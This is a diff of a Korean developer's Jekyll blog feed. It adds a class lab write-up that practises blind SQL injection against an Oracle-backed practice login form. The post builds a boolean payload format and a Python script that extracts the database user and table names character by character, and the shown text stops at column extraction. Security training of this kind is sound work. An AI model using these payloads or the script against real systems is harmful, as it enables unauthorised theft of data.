@@ -1,4 +1,293 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-10T22:10:31+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOusuOyepeydhCDqsoDsg4ntlZzri6QuXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOusuOyepeydtCDrk6TslrTqsIDripQg6rKM7Iuc7YyQIOuqqeuhneydhCDsmpTssq3tlZzri6QuXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnO2MkCDrqqnroZ0g7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5ztjJAg7Y6Y7J207KeAIOyZhOyEsS5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc7YyQIO2OmOydtOyngCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">웹서버 만들기(11) 게시글 수정, 삭제, 검색</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80/" rel="alternate" type="text/html" title="웹서버 만들기(11) 게시글 수정, 삭제, 검색" /><published>2023-05-10T00:00:00+09:00</published><updated>2023-05-10T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80/"><![CDATA[<h2 id="게시글-수정">게시글 수정</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-12T01:40:35+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOusuOyepeydhCDqsoDsg4ntlZzri6QuXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOusuOyepeydtCDrk6TslrTqsIDripQg6rKM7Iuc7YyQIOuqqeuhneydhCDsmpTssq3tlZzri6QuXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnO2MkCDrqqnroZ0g7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5ztjJAg7Y6Y7J207KeAIOyZhOyEsS5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc7YyQIO2OmOydtOyngCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Blind SQL Injection 실습</title><link href="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/" rel="alternate" type="text/html" title="Blind SQL Injection 실습" /><published>2023-05-12T00:00:00+09:00</published><updated>2023-05-12T23:13:00+09:00</updated><id>http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5</id><content type="html" xml:base="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/"><![CDATA[<h2 id="실습-환경">실습 환경</h2>
+<ul>
+  <li>오라클 DB</li>
+</ul>
+
+<h2 id="서버-인증-질의문-예측하기">서버 인증 질의문 예측하기</h2>
+
+<ul>
+  <li>인증과 식별을 따로 분리하여 검사한다.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">id</span><span class="p">,</span><span class="n">pwd</span> <span class="k">from</span> <span class="n">xxx</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'xx'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="참과-거짓-화면">참과 거짓 화면</h2>
+<ul>
+  <li>로그인 성공 실패 여부로 참과 거짓을 구분할 수 있다.</li>
+</ul>
+
+<h3 id="참">참</h3>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+</code></pre></div></div>
+
+<ul>
+  <li>로그인 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/57c7f54d-5fef-454e-9060-047ac800766a" alt="Pasted image 20230511135315" /></li>
+</ul>
+
+<h3 id="거짓">거짓</h3>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+</code></pre></div></div>
+
+<ul>
+  <li>로그인 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/310a130f-2f28-444b-b75d-3692cc977cfd" alt="Pasted image 20230511135242" /></li>
+</ul>
+
+<h2 id="select-문-사용-가능-확인">select 문 사용 가능 확인</h2>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="s1">'test'</span><span class="p">)</span><span class="o">=</span><span class="s1">'test'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+<span class="err">성공</span>
+
+<span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span>
+<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">)</span><span class="o">=</span><span class="s1">'test'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+<span class="err">성공</span>
+</code></pre></div></div>
+
+<ul>
+  <li>로그인 성공. select 문을 사용할 수 있다.</li>
+</ul>
+
+<h2 id="공격-포맷-만들기">공격 포맷 만들기.</h2>
+<ul>
+  <li>Blind SQL Injection 은 한 문자씩 확인하는 공격이다.</li>
+  <li>ascii 와 substr 함수를 이용할 것 이다.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="s1">'t'</span><span class="p">)</span><span class="o">=</span><span class="s1">'t'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+<span class="err">성공</span>
+
+<span class="n">ascii</span> <span class="err">함수를</span> <span class="err">문자를</span> <span class="err">이용하여</span> <span class="err">아스키코드로</span> <span class="err">변환한다</span><span class="p">.</span>
+<span class="n">ascii</span><span class="p">(</span><span class="s1">'t'</span><span class="p">)</span>
+<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="s1">'t'</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+<span class="err">성공</span>
+
+<span class="s1">'t'</span> <span class="err">한</span> <span class="err">문자</span> <span class="err">추출하기</span><span class="p">.</span>
+<span class="n">substr</span><span class="p">(</span><span class="s1">'test'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="s1">'test'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+<span class="err">성공</span>
+
+<span class="err">공격문</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">SQL</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+
+<span class="s1">'test'</span> <span class="err">출력하기</span><span class="p">.</span>
+<span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
+<span class="err">공격문</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+<span class="err">성공</span>
+</code></pre></div></div>
+
+<ul>
+  <li>완성된 공격 포맷</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">SQL</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+</code></pre></div></div>
+
+<h2 id="base가-되는-파이썬-코드">Base가 되는 파이썬 코드</h2>
+<ul>
+  <li>인자로 쿼리문을 삽입해 주면 된다.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FAIL_LEN</span> <span class="o">=</span> <span class="mi">1482</span><span class="p">;</span>
+<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://221.27.0.6/main_page/sql_injection_prob/login_methods/division_blind_sql_injection/authentication"</span>
+<span class="n">COOKIES</span> <span class="o">=</span> <span class="p">{</span><span class="s">'JSESSIONID'</span><span class="p">:</span><span class="s">'E092AC001C0A642C200BD6902B7EF6A5'</span><span class="p">}</span>
+<span class="n">DATA</span><span class="o">=</span><span class="p">{</span><span class="s">'user_name'</span><span class="p">:</span><span class="s">'user2'</span><span class="p">,</span> <span class="s">'user_password'</span><span class="p">:</span><span class="s">'2222'</span><span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">is_success</span><span class="p">()</span><span class="o">-&gt;</span><span class="nb">bool</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">URL</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span> <span class="n">COOKIES</span><span class="p">,</span><span class="n">data</span><span class="o">=</span> <span class="n">DATA</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="nf">len</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> <span class="o">!=</span> <span class="n">FAIL_LEN</span><span class="p">;</span>
+  
+<span class="k">def</span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">row</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
+</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="ow">not</span> <span class="nf">is_success</span><span class="p">()</span> <span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="p">;</span>
+  
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">point</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
+</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="n">point</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="ow">not</span> <span class="nf">is_success</span><span class="p">():</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="p">;</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1"># 이분 탐색
+</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">s</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="mi">126</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="n">e</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="n">e</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="n">point</span><span class="p">,</span><span class="n">m</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="nf">is_success</span><span class="p">()</span> <span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">s</span> <span class="o">=</span> <span class="n">m</span><span class="o">+</span><span class="mi">1</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">else</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="n">m</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
+</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">s</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">,</span><span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">point</span> <span class="o">+=</span><span class="mi">1</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">()</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
+</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">row</span><span class="o">+=</span><span class="mi">1</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
+<span class="c1"># sql 질의문
+# row 0 부터 시작
+# point 1 부터 시작
+# ascii
+</span><span class="k">def</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">row</span><span class="p">,</span> <span class="n">point</span><span class="p">,</span> <span class="nb">ascii</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span> <span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">attack_query</span> <span class="o">=</span> <span class="p">(</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">"user2' and ((ascii(substr(("</span><span class="p">,</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">sql</span><span class="p">,</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">" OFFSET "</span><span class="p">,</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="n">row</span><span class="p">),</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">" ROWS FETCH NEXT 1 ROWS ONLY),"</span><span class="p">,</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="n">point</span><span class="p">),</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">",1)))&gt;"</span><span class="p">,</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="nb">ascii</span><span class="p">),</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">") and '1'='1"</span>
+<span class="err"> </span> <span class="err"> </span> <span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">attack_query</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="사용자-명-추출-하기">사용자 명 추출 하기.</h2>
+<ul>
+  <li>현재 사용중인 사용자 명을 출력한다.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">user</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
+<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">user</span> <span class="k">from</span> <span class="n">dual</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+<span class="err">성공</span>
+
+<span class="err">한</span> <span class="err">문자씩</span> <span class="err">찾아주면</span> <span class="err">된다</span><span class="p">.</span>
+</code></pre></div></div>
+
+<ul>
+  <li>파이썬 코드로 빠르게 사용자 명 찾기.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_current_user_name</span><span class="p">():</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select user from dual"</span>
+<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="o">=</span> <span class="n">query</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
+</code></pre></div></div>
+
+<ul>
+  <li>추출한 데이터.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C##DBFORPROB
+</code></pre></div></div>
+
+<h2 id="테이블-명-추출하기">테이블 명 추출하기.</h2>
+<ul>
+  <li>현재 존재하는 테이블 명들을 추출해 보자.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">all_tables</span> <span class="k">where</span> <span class="k">owner</span><span class="o">=</span><span class="s1">'C##DBFORPROB'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
+<span class="err">또는</span> 
+<span class="k">select</span> <span class="n">tname</span> <span class="k">from</span> <span class="n">tab</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
+
+<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">all_tables</span> <span class="k">where</span> <span class="k">owner</span><span class="o">=</span><span class="s1">'C##DBFORPROB'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+
+<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="n">tname</span> <span class="k">from</span> <span class="n">tab</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
+
+<span class="err">더</span> <span class="err">짧은</span> <span class="mi">2</span><span class="err">번째</span> <span class="err">공격</span> <span class="err">포맷을</span> <span class="err">이용하였다</span><span class="p">.</span>
+</code></pre></div></div>
+
+<ul>
+  <li>파이썬 코드로 빠르게 테이블 명 찾기.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_table_name</span><span class="p">():</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select tname from tab"</span>
+<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
+</code></pre></div></div>
+
+<ul>
+  <li>추출한 데이터.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS
+TEST
+</code></pre></div></div>
+
+<h2 id="컬럼-명-추출하기">컬럼 명 추출하기.</h2>
+<ul>
+  <li>테이블의 컬럼명을 추출하기.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'MEMBERS'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
+<span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'TEST'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
+
